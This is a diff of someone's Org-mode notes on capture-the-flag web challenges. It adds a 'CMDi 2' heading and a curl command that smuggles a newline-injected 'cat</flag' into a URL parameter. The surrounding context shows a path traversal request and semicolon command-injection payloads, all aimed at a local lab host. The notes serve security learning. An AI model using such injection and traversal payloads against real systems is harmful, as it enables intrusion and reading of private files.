@@ -91,7 +91,7 @@ curl "challenge.localhost/serve/fortunes/..%2F..%2F..%2Fflag"
 #+end_src
 ** 参考
 1. [[https://blog.hamayanhamayan.com/entry/2021/12/08/220449][CTFのWebセキュリティにおけるPath Traversal, LFI/RFI (File Upload, ZipSlip) - はまやんはまやんはまやん]]
-* CMDi 1
+* TODO CMDi 1
 :LOGBOOK:
 - Note taken on [2026-06-10 水 09:16] \\
   #+begin_comment
@@ -151,4 +151,9 @@ curl "http://challenge.localhost:80/resource?dir=;cat%20/flag"
 
 #+begin_src shell
 curl "http://challenge.localhost:80/resource?dir=;cat</flag"
+#+end_src
+* TODO CMDi 2
+
+#+begin_src shell
+curl "http://challenge.localhost/event?top-path=%0acat</flag"
 #+end_src
